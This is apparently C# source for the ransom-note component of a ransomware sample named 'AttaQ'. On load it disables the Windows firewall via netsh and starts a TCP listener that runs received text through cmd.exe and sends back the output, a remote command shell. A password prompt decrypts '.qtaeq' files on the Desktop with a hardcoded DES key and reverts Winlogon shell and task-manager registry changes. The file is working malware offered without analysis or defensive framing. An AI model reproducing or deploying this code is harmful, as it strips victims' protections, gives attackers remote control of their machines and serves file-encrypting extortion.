using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AttaQ
{
    public partial class Attack : Form
    {
        static string key = "password";
        TcpListener serverSocket = null;
        TcpClient clientSocket = null;


        private void InitSocket()
        {
            //string ip_addr = "192.168.0.1";

            int ip_port = Int32.Parse("12345");
            MessageBox.Show("port : " + ip_port);
            try
            {
                serverSocket = new TcpListener(IPAddress.Any, ip_port);
                clientSocket = default(TcpClient);
                serverSocket.Start();
                DisplayText(" >> Server Started");

                clientSocket = serverSocket.AcceptTcpClient();
                DisplayText(" >> Accept connection from client");

                Thread threadHandler = new Thread(new ParameterizedThreadStart(OnAccepted));
                threadHandler.IsBackground = true;
                threadHandler.Start(clientSocket);
            }
            catch (SocketException se)
            {
                DisplayText(string.Format("InitSocket : SocketException : {0}", se.Message));
            }
            catch (Exception ex)
            {
                DisplayText(string.Format("InitSocket : Exception : {0}", ex.Message));
            }
        }

        private void OnAccepted(object sender)
        {
            TcpClient clientSocket = sender as TcpClient;
            System.Diagnostics.ProcessStartInfo pri = new System.Diagnostics.ProcessStartInfo();
            System.Diagnostics.Process pro = new System.Diagnostics.Process();

            pri.FileName = "cmd.exe";

            pri.CreateNoWindow = false;
            pri.UseShellExecute = false;

            pri.RedirectStandardInput = true;
            pri.RedirectStandardOutput = true;
            pri.RedirectStandardError = true;

            pro.StartInfo = pri;


            while (true)
            {
                try
                {
                    NetworkStream stream = clientSocket.GetStream();
                    byte[] buffer = new byte[1024];

                    stream.Read(buffer, 0, buffer.Length);
                    string msg = Encoding.Unicode.GetString(buffer);
                    msg = msg.Substring(0, msg.IndexOf("$"));
                    DisplayText(" >> Data from client - " + msg);


                    pro.Start();

                    pro.StandardInput.Write(@msg + Environment.NewLine);
                    pro.StandardInput.Close();

                    string resultValue = pro.StandardOutput.ReadToEnd();
                    pro.WaitForExit();
                    pro.Close();

                    // MessageBox.Show(resultValue);

                    string response = "Last Message from client - " + msg;
                    byte[] sbuffer = Encoding.Unicode.GetBytes(resultValue);

                    stream.Write(sbuffer, 0, sbuffer.Length);
                    stream.Flush();

                    DisplayText(" >> " + response);

                }
                catch (SocketException se)
                {
                    DisplayText(string.Format("OnAccepted : SocketException : {0}", se.Message));
                    break;
                }
                catch (Exception ex)
                {
                    DisplayText(string.Format("OnAccepted : Exception : {0}", ex.Message));
                    break;
                }
            }

            clientSocket.Close();
        }

        private void DisplayText(string text)
        {
            if (tb_recv.InvokeRequired)
            {
                tb_recv.BeginInvoke(new MethodInvoker(delegate
                {
                    tb_recv.AppendText(text + Environment.NewLine);
                }));

            }
            else
                tb_recv.AppendText(text + Environment.NewLine);

        }
        public void DecryptFile(string ReadFilename, string WriteFilename)//파일 복호화
        {
            FileStream fsread = new FileStream(ReadFilename, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);

            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = ASCIIEncoding.ASCII.GetBytes(key);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(key);     // 복호화 Key

            ICryptoTransform Decrypt = DES.CreateDecryptor();
            CryptoStream cryptostreamDecr = new CryptoStream(fsread, Decrypt, CryptoStreamMode.Read);

            StreamWriter fsDecrypted = new StreamWriter(WriteFilename);
            fsDecrypted.Write(new StreamReader(cryptostreamDecr).ReadToEnd());
            fsDecrypted.Flush();
            fsDecrypted.Close();
            fsread.Close();

            System.IO.File.Delete(ReadFilename);    // 원본파일 삭제
        }
        static void firewall()
        {
            // 방화벽 설정 해제
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.Write(@"netsh advfirewall set allprofiles state off" + Environment.NewLine);
            cmd.StandardInput.Write(@" netsh f s o d" + Environment.NewLine);   // lunch in WinXP
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            // MessageBox.Show(cmd.StandardOutput.ReadToEnd());

        }

        public Attack()
        {
            InitializeComponent();
        }

        private void Attack_Load(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.FixedSingle;

            FileStream fsInput = new FileStream("C:\\WINDOWS\\log.q", FileMode.Open, FileAccess.Read, FileShare.None);

            byte[] buf = new byte[fsInput.Length];
            fsInput.Read(buf, 0, buf.Length);
            richTextBox1.Text = Encoding.UTF8.GetString(buf);
            fsInput.Close();

            // 방화벽 해제
            firewall();

            // 소켓 스레드 시작
            new Thread(delegate ()
            {
                InitSocket();
            }).Start();
        }

        private void Bt_ok_Click(object sender, EventArgs e)
        {
            if (tb_pass.Text.Equals("password"))
            {
                MessageBox.Show("Correct Password !! Wait For Decrypt");
                //Registry Change;
                RegistryKey reg;
                string tex = "Explorer.exe";
                reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
                reg.SetValue("shell", tex);
                reg.Close();


                int boll = 0;
                reg = Registry.CurrentUser.CreateSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("Disabletaskmgr", boll);
                reg.Close();

                string localpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                string[] filename = Directory.GetFiles(localpath, "*.*", SearchOption.AllDirectories);
                int len = filename.Length;

                for (int i = 0; i < len; i++)
                {

                    string fname = filename[i];
                    FileInfo finfo = new FileInfo(fname);
                    if (!finfo.Exists || !Path.GetExtension(fname).Equals(".qtaeq")) continue;

                    string decname = Path.GetFileNameWithoutExtension(fname);
                    string origext = Path.GetExtension(decname);
                    decname = Path.GetFileNameWithoutExtension(decname) + "_dec" + origext;
                    // MessageBox.Show("Decript " + fname + "...");
                    DecryptFile(fname, Path.GetDirectoryName(fname) + "\\" + decname);
                    // MessageBox.Show("Decript " + fname + " To " + decname + " Success !!");
                }


                MessageBox.Show("Success to Decrypt !!");

                /*
                // File Del
                for(int i = 0; i < len; i++)
                {
                    FileInfo delfile = new FileInfo(filename[i]);
                    delfile.Delete();
                    
                }
                */

                System.Diagnostics.Process.Start("Explorer.exe");
                this.Close();
            }
            else
            {
                MessageBox.Show("Wrong Password !!");
            }
        }

        private void Attack_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (clientSocket != null)
            {
                clientSocket.Close();
                clientSocket = null;
            }

            if (serverSocket != null)
            {
                serverSocket.Stop();
                serverSocket = null;
            }
        }
    }
}
